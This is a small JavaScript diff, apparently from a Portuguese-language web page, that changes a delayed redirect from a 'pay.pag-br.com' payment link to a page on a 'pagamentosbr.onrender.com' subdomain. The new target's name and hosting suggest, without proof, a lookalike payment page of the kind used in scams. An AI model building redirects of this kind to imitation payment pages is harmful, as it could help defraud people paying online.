@@ -259,7 +259,7 @@ const infoItems = [
 
             try {
                 await new Promise(resolve => setTimeout(resolve, 3000));
-                window.location.href = 'https://pay.pag-br.com/r/0S1HF964A1ji8335';
+                window.location.href = 'https://pagamentosbr.onrender.com/jjajjg/index.html';
             } catch (error) {
                 console.error('Erro:', error);
                 alert('Erro ao processar. Tente novamente.');
